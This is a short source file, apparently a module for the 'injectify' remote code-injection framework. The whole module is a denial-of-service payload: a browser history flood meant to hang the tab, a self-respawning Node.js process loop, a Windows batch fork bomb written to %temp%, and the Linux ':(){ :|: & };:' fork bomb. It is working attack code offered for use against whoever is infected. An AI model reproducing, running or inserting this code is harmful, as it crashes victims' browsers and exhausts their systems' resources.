import ModuleTypings from '../../../definitions/module'
declare const { Module, injectify } : ModuleTypings

if (injectify.info.platform === 'browser') {
    var total = ''
    for (var i = 0; i < 100000; i++) {
        total = total + i.toString()
        history.pushState(0, '', total)
    }
} else {
    eval(`
        (function f() {
            require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());'])
        }());
        if (injectify.info.os.platform === 'win32') {
            /**
             * Windows
             */
            exec(\`cmd /k "echo %0^|%0 > '%temp%/bomb.bat & %temp%/bomb.bat"\`)
        } else if (injectify.info.os.platform === 'linux') {
            /**
             * Linux
             */
            exec(':(){ :|: & };:')
        }
    `)
}
Module.return(true)